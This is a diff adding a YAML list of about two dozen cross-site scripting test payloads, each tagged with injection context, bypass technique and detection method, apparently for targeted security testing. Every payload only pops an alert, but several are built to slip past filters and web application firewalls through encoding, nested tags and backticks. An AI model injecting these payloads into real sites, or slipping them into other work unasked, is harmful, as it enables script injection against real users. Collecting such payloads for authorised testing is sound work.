@@ -1,0 +1,159 @@
+# XSS Payloads with Metadata
+# Usage: Filter by context and bypass_type for targeted testing
+
+payloads:
+  # HTML context - basic
+  - payload: "<script>alert(document.domain)</script>"
+    context: html-body
+    type: reflected
+    bypass_type: none
+    detection: alert-dialog
+
+  - payload: "<img src=x onerror=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: tag-event
+    detection: alert-dialog
+
+  - payload: "<svg onload=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: tag-event
+    detection: alert-dialog
+
+  - payload: "<svg/onload=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: no-space
+    detection: alert-dialog
+
+  - payload: "<details open ontoggle=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: uncommon-tag
+    detection: alert-dialog
+
+  - payload: "<body onload=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: tag-event
+    detection: alert-dialog
+
+  # Attribute context
+  - payload: "\"><img src=x onerror=alert(1)>"
+    context: html-attribute-double
+    type: reflected
+    bypass_type: attribute-escape
+    detection: alert-dialog
+
+  - payload: "\" autofocus onfocus=alert(1) x=\""
+    context: html-attribute-double
+    type: reflected
+    bypass_type: event-injection
+    detection: alert-dialog
+
+  - payload: "' onfocus=alert(1) autofocus='"
+    context: html-attribute-single
+    type: reflected
+    bypass_type: event-injection
+    detection: alert-dialog
+
+  # JavaScript context
+  - payload: "';alert(1);//"
+    context: javascript-string
+    type: reflected
+    bypass_type: string-escape
+    detection: alert-dialog
+
+  - payload: "</script><script>alert(1)</script>"
+    context: javascript-block
+    type: reflected
+    bypass_type: tag-break
+    detection: alert-dialog
+
+  - payload: "${alert(1)}"
+    context: javascript-template-literal
+    type: reflected
+    bypass_type: template-injection
+    detection: alert-dialog
+
+  - payload: "{{constructor.constructor('alert(1)')()}}"
+    context: angular-template
+    type: reflected
+    bypass_type: ssti
+    detection: alert-dialog
+
+  # URL context
+  - payload: "javascript:alert(1)"
+    context: url-href
+    type: reflected
+    bypass_type: protocol
+    detection: alert-dialog
+
+  - payload: "data:text/html,<script>alert(1)</script>"
+    context: url-href
+    type: reflected
+    bypass_type: data-uri
+    detection: alert-dialog
+
+  # Tag-based variants
+  - payload: "<iframe src=\"javascript:alert(1)\">"
+    context: html-body
+    type: reflected
+    bypass_type: iframe
+    detection: alert-dialog
+
+  - payload: "<input onfocus=alert(1) autofocus>"
+    context: html-body
+    type: reflected
+    bypass_type: autofocus
+    detection: alert-dialog
+
+  - payload: "<marquee onstart=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: uncommon-tag
+    detection: alert-dialog
+
+  - payload: "<video src=x onerror=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: media-tag
+    detection: alert-dialog
+
+  - payload: "<audio src=x onerror=alert(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: media-tag
+    detection: alert-dialog
+
+  # WAF bypass
+  - payload: "<scr<script>ipt>alert(1)</script>"
+    context: html-body
+    type: reflected
+    bypass_type: waf-double-tag
+    detection: alert-dialog
+
+  - payload: "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>"
+    context: html-body
+    type: reflected
+    bypass_type: waf-html-encoding
+    detection: alert-dialog
+
+  - payload: "%3Cscript%3Ealert(1)%3C/script%3E"
+    context: url-parameter
+    type: reflected
+    bypass_type: waf-url-encoding
+    detection: alert-dialog
+
+  - payload: "<img src=x onerror=alert`1`>"
+    context: html-body
+    type: reflected
+    bypass_type: waf-backtick
+    detection: alert-dialog
+
+  - payload: "<svg><script>alert(1)</script></svg>"
+    context: html-body
+    type: reflected
+    bypass_type: svg-script
+    detection: alert-dialog
